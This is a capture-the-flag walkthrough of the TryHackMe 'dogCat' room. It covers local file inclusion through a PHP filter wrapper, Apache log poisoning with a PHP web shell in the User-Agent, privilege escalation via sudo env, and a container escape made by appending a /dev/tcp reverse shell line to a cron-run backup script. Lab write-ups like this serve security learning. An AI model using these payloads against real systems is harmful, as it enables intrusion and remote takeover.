![Screenshot 2023-10-17 135404.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/nSkIlFr.png)

![Screenshot 2023-10-17 135404.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/ce2fe16cfcdac475834f262306243b0a.png)

# dogCat

"dogCat" is a website created with PHP that allows users to view cat and dog images. It serves as a source of comfort and relaxation, especially for those feeling down. It may also be associated with the "dogCat" TryHackMe Capture The Flag (CTF) challenge, which involves tasks such as scanning the network and discovering directories.

### Scanning

```jsx
nmap -A -T4 -Pn 10.10.85.143 -oN nmap_result.txt
```

![Screenshot 2023-10-17 135404.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_135404.png)

It looks like only SSH and HTTP is open, fair enough.

### Directory Enumeration

```jsx
gobuster dir -u http://10.10.85.143/ -w /home/kali/Downloads/SecLists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -o gobuster_output.txt -t 10
```

![Screenshot 2023-10-17 151238.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_151238.png)

 Let’s check the site in the browser…

![Screenshot 2023-10-17 135929.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_135929.png)

![Screenshot 2023-10-17 135955.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_135955.png)

We have two buttons that lead to “/?view=dog” and “/?view=cat” respectively

When we click either one we get the index page with a random dog/cat image appended at the end

After few minutes of fiddling we find out that:

- there are files called “dog.php” and “cat.php” that return a random image
- the “?view=” query runs “include” on our parameter only if the word “dog” or “cat” is present
- the file automatically appends .php to our parameter
- php base64 filter is working on this queryLet’s try to bypass this check with directory traversal:“/?view=php://filter/read=convert.base64-encode/resource=./dog/../index”

### ****Using Base64 Encoding to View Source Code****

We can specify the following PHP Wrapper to encode a file in Base64.

`php://filter/convert.base64-encode/resource=**<filename>**`

Let’s inject that into our LFI, and specify the file we want to view the contents of(index.php)

“/?view=php://filter/read=convert.base64-encode/resource=./dog/../index”

![Screenshot 2023-10-17 141115.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_141115.png)

```jsx
[http://10.10.85.143/?view=php://filter/read=convert.base64-encode/resource=./dog/../index](http://10.10.85.143/?view=php://filter/read=convert.base64-encode/resource=./dog/../index)
```

Now, let’s copy that returned Base64 and run the following command within Kali.

`echo -n <Base64> | base64 -d`

or 

Go to website [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

![Screenshot 2023-10-17 141525.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_141525.png)

The site checks if the “ext” parameter was provided, and if not it adds “.php” by default to our filename

According to our nmap scan the server runs on Apache so let’s try to get code execution with `**log poisoning.**`
The access log path for Apache is “/var/log/apache2/access.log” so let’s try to load it by adding multiple “../” to our path like this:

“/?view=dog/../../../../var/log/apache2/access.log&ext”

(remember the “ext” check? we can remove the “.php” extension just by defining it in the query)

By using `**Burpsuit repeater module**`

![Screenshot 2023-10-17 144238.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_144238.png)

### ##Remote code execution (RCE)

We can see that next to the route there is the User-Agent parameter. We can insert a small php script to later use the log for code execution:

```jsx
<?php system($_GET['cmd']);?>
```

Now when we are requesting the index page with the log we can add a “cmd” parameter with the command we want to execute:
“/?view=./dog/../../../../../../../var/log/apache2/access.log&ext&cmd=whoami”

![Screenshot 2023-10-17 144635.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_144635.png)

To get the reverse shell we have to execute the php reverse shell command with URL encoded.

![Screenshot 2023-10-17 144945.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_144945.png)

![Screenshot 2023-10-17 145135.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_145135.png)

and also start the listener in our target machine before sending this URL.

We get the reverse shell.

### ****Finding flags****

First flag was pretty easy to spot just by running “ls” in the starting directory:

![Screenshot 2023-10-17 145458.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_145458.png)

The second flag was also easy, just cd into the parent directory and there it is:

![Screenshot 2023-10-17 145715.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_145715.png)

The third flag is hidden in the /root folder so we need to get root privileges to get it
Running “sudo -l” reveals that we can execute “/usr/bin/env” as root without a password:

![Screenshot 2023-10-17 145848.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_145848.png)

[https://gtfobins.github.io/](https://gtfobins.github.io/)

![Screenshot 2023-10-17 150019.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_150019.png)

Let’s use it to get an elevated shell:

![Screenshot 2023-10-17 150140.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_150140.png)

### ##Container privileged escalation to the host machine

The fourth flag is outside this box. This is possible because the box we’re in is a container inside another box.
We can see this by going into “/opt/backups” and looking around the backup archive.

We can also see that the archive has a very recent date when compared to the script so that must mean the script is ran regurarly on the parent box.
Let’s use that fact to get ourselves a reverse shell on the parent machine:

```jsx
echo "sh -i >& /dev/tcp/10.17.11.201/5555 0>&1" >>backup.sh
```

![Screenshot 2023-10-17 150531.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_150531.png)

Finally we get the parent machine reverse shell of the host machine and also we get the fourth flag!

![Screenshot 2023-10-17 150630.png](dogCat%20cf5cfaa7d7854a5d9958ca7bb6ff7028/Screenshot_2023-10-17_150630.png)